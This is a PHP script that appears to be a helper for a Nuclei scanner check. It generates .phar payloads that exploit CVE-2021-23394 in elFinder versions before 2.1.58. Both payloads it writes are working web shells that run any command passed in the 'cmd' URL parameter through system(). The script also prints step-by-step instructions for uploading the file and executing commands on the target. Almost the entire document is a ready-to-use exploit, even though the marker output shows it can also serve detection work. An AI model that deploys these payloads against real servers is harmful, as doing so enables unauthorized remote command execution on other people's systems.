#!/usr/bin/env php
<?php
/**
 * CVE-2021-23394 - elFinder PHAR Payload Generator
 * 
 * This script generates a minimal .phar file that executes PHP code
 * when parsed by a PHP-enabled web server.
 * 
 * Usage:
 *   php gen_phar.php [output_file] [marker]
 * 
 * Example:
 *   php gen_phar.php exploit.phar PWNED_BY_NUCLEI
 * 
 * Requirements:
 *   - PHP 7.0+ with Phar extension
 *   - phar.readonly = 0 in php.ini
 * 
 * Author: princechaddha
 * CVE: CVE-2021-23394
 */

// Configuration
$defaultOutputFile = 'exploit.phar';
$defaultMarker = 'NUCLEI_RCE_' . bin2hex(random_bytes(8));

// Parse arguments
$outputFile = $argv[1] ?? $defaultOutputFile;
$marker = $argv[2] ?? $defaultMarker;

// Check if phar.readonly is disabled
if (ini_get('phar.readonly')) {
    echo "[ERROR] phar.readonly is enabled. Run with: php -d phar.readonly=0 gen_phar.php\n";
    exit(1);
}

// Remove existing file if present
if (file_exists($outputFile)) {
    unlink($outputFile);
}

echo "===========================================\n";
echo "CVE-2021-23394 PHAR Payload Generator\n";
echo "===========================================\n";
echo "\n";

try {
    // Create new Phar archive
    $phar = new Phar($outputFile);
    
    // Start buffering
    $phar->startBuffering();
    
    // Create stub that outputs our marker when executed
    $stub = <<<STUB
<?php
// CVE-2021-23394 - elFinder RCE Exploit Payload
// This file demonstrates the vulnerability
echo "$marker";
// Optionally execute system command
if (isset(\$_GET['cmd'])) {
    echo "\\n";
    system(\$_GET['cmd']);
}
__HALT_COMPILER();
STUB;
    
    $phar->setStub($stub);
    
    // Add a dummy file (required for valid phar)
    $phar->addFromString('index.php', "<?php echo '$marker'; ?>");
    
    // Stop buffering and write to disk
    $phar->stopBuffering();
    
    // Get file info
    $fileSize = filesize($outputFile);
    $md5Hash = md5_file($outputFile);
    
    echo "[+] PHAR file created successfully!\n";
    echo "\n";
    echo "File Details:\n";
    echo "  Output:    $outputFile\n";
    echo "  Size:      $fileSize bytes\n";
    echo "  MD5:       $md5Hash\n";
    echo "  Marker:    $marker\n";
    echo "\n";
    echo "Usage:\n";
    echo "  1. Upload this file to elFinder < 2.1.58\n";
    echo "  2. Access the file directly: http://target/elFinder/files/$outputFile\n";
    echo "  3. If vulnerable, you'll see: $marker\n";
    echo "  4. For command execution: http://target/elFinder/files/$outputFile?cmd=id\n";
    echo "\n";
    echo "[+] Done!\n";
    
} catch (Exception $e) {
    echo "[ERROR] Failed to create PHAR: " . $e->getMessage() . "\n";
    exit(1);
}

// Alternative: Create simple PHP file disguised as .phar
// This works when server treats .phar as PHP but doesn't require Phar extension
function createSimplePhar($outputFile, $marker) {
    $content = "<?php echo '$marker'; if(isset(\$_GET['cmd'])){system(\$_GET['cmd']);} ?>";
    file_put_contents($outputFile, $content);
    return true;
}

echo "\n";
echo "===========================================\n";
echo "Alternative: Simple PHP payload (no Phar ext needed)\n";
echo "===========================================\n";

$simpleFile = str_replace('.phar', '_simple.phar', $outputFile);
createSimplePhar($simpleFile, $marker);

echo "[+] Simple payload created: $simpleFile\n";
echo "    Content: <?php echo '$marker'; ... ?>\n";
echo "\n";
